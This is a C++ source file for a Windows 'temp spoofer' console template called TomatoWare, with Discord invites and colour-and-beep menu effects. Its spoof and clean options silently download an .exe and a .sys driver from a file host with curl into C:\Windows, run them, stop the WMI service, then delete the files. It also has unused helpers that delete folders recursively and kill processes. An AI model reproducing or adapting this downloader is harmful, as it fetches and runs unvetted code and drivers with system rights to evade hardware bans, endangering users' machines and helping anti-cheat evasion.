//If you got any Error make sure your going to Debug to REALES!!! or it wont work also if you have any error join this discord serer: //discord.gg/MJeY3BhJUf
//My Name is Cr$my just make a Tickit or write me a dm
//Thanks For Using My Template for your own Consel Src i used is as a Temp

#include <iostream>
#include "Windows.h" 
#include <cstdlib>  // for system ()
#include <tlhelp32.h>
#include <string>
#include <vector>

void spoofingisdone() {
    system("cls");
    std::cout << "yeah and now ur spoofed have fun # TOMATOWARE ON TOP\n";
    std::cout << "Closing in 5 secs\n";
    Sleep(5000);
    exit(0);
}

void setConsoleGreen() {
    // Set Consel color Green
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN);
}
void setConsoleRed() {
    // set consel color Red
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
}

void resetConsoleColor() {
    // Reset Console Color
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}
void terminateProcess(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
}

void deleteFile(const std::string& filePath) {
    if (DeleteFile(filePath.c_str()) == 0) {
        std::cerr << "Failed to delete file: " << filePath << " (Error: " << GetLastError() << ")\n";
    }
}

void deleteFilesInDirectory(const std::string& directory) {
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(searchPath.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        const std::string fileOrDir = findFileData.cFileName;
        if (fileOrDir != "." && fileOrDir != "..") {
            std::string fullPath = directory + "\\" + fileOrDir;

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                deleteFilesInDirectory(fullPath);
                RemoveDirectory(fullPath.c_str());
            }
            else {
                deleteFile(fullPath);
            }
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void typeEffect(const std::string& text, int delay) {
    for (char c : text) {
        std::cout << c;
        Sleep(delay); // Delay
    }
    std::cout << std::endl; // new Line
}

void SetConsoleColor(WORD color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

// Transparenzy
void SetConsoleTransparency(int transparency) {
    HWND hwnd = GetConsoleWindow();

    // Stelle sicher, dass das Fenster 'layered' ist, um Transparenz zu ermöglichen
    LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
    SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);

    // Setze die Transparenz des Fensters mit SetLayeredWindowAttributes
    SetLayeredWindowAttributes(hwnd, 0, transparency, LWA_COLORKEY); // transparency ist ein Wert von 0 bis 255
}

void openDiscordLink() {
    // Open The Link
    system("start https://discord.gg/DmZG2mHvVM"); //your Discord server
}

void setConsoleYellow() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); // Handle für die Konsole
    SetConsoleTextAttribute(hConsole, 14);            // 14 Mens Yellow
}
void setConsolePink() {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_BLUE); // Pink = Rot + Blau
}

void someFunction() {
    // Beispielaktion Beep Soind
    Beep(500, 500);

    // go back to your mein Funktion
    someFunction();
}







int main()
{


    SetConsoleTitleA("TomateWare Free Temp                      Made By Cr$my                                                 [ Bulid 14.12.2024 23:10 ]                      Made By Cr$my                                                 ");
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    SetConsoleTransparency(128);
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << "[Info]" << std::flush;
    SetConsoleColor(FOREGROUND_BLUE);
    typeEffect(" Welcome to TomatoWare Free Temp Woofer MADE BY Cr$my", 30);
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    Sleep(3000);


    system("cls");
    setConsolePink();
    Beep(500, 500);
    typeEffect(" Made by Cr$my", 40);
    Sleep(5000);

    // Blaue Farbe und erste Infozeile
    SetConsoleColor(FOREGROUND_BLUE);
    typeEffect(" [Info]", 0);

    // Rote Farbe und Ladeanzeige
    SetConsoleColor(FOREGROUND_RED);
    typeEffect(" Loading the Woofer", 40);
    Sleep(5000);
    setConsolePink();
    typeEffect(" Done", 40);
    Sleep(2500);
    Beep(500, 500);

    // Grüne Farbe und Statusanzeige
    setConsoleGreen();
    typeEffect(" IF color Green Working and UD", 30);
    Sleep(2500);

    // Gelbe Farbe und Statusanzeige
    setConsoleYellow();
    typeEffect(" IF color Yellow Working but Semi UD", 30);
    Sleep(2500);

    // Rote Farbe und Statusanzeige
    setConsoleRed();
    typeEffect(" IF color Red not Working or not UD", 20);
    Sleep(2500);
    Beep(500, 500);
    setConsolePink();
    Beep(500, 500);
    typeEffect(" Status: Yellow", 40);
    Sleep(5000);
    setConsoleYellow();
    std::cout << ("\n\n [1] Temp Spoof\n [2] Clean\n [3] Check Serials\n [4] Join Discord\n [5] Exit\n\n Choose option: ");

    int option;
    std::string username;
    std::string password;
    std::string key;

    std::cin >> option;
    switch (option)
    {
    case 1:

        system("curl --silent https://files.catbox.moe/YourFile -o C:\\Windows\\YourFile.sys >nul");
        system("curl --silent https://files.catbox.moe/YourFile -o C:\\Windows\\YourFile.exe >nul");

        system("C:\\Windows\\YourFile.exe C:\\Windows\\YourFile.sys");
        system("net stop winmgmt /y");

        std::remove("C:\\Windows\\YourFile.sys");
        std::remove("C:\\Windows\\YourFile.exe");
        Beep(500, 500);
        MessageBox(NULL, "Spoofing is done", "Free Shit", MB_OK);
        openDiscordLink(); //line 117 to change to your Discord Link

        main();

    case 2:
        system("curl --silent https://files.catbox.moe/YourFile -o C:\\Windows\\YourFile.exe >nul");

        system("C:\\Windows\\YourFile.exe");


        std::remove("C:\\Windows\\YourFile.exe");




        openDiscordLink(); //line 117 to change to your Discord Link
        main();


    case 3:

        std::cout << "Disk Drive Serials\n";
        system("wmic diskdrive get model, serialnumber");
        std::cout << "CPU Serials\n";
        system("wmic cpu get serialnumber");

        std::cout << "BIOS Serials\n";
        system("wmic bios get serialnumber");

        std::cout << "Motherbaord Serials\n";
        system("wmic baseboard get serialnumber");

        std::cout << "UUID\n";
        system("wmic path win32_computersystemproduct get uuid");

        std::cout << "MAC\n";
        system("getmac");

        std::cout << "Press any key to go back\n";
        system("pause>nul");
        openDiscordLink();

        main();

    case 4:
        openDiscordLink(); //line 117 to change to your Discord Link
        main();

    case 5:

        exit(0);
    }

}


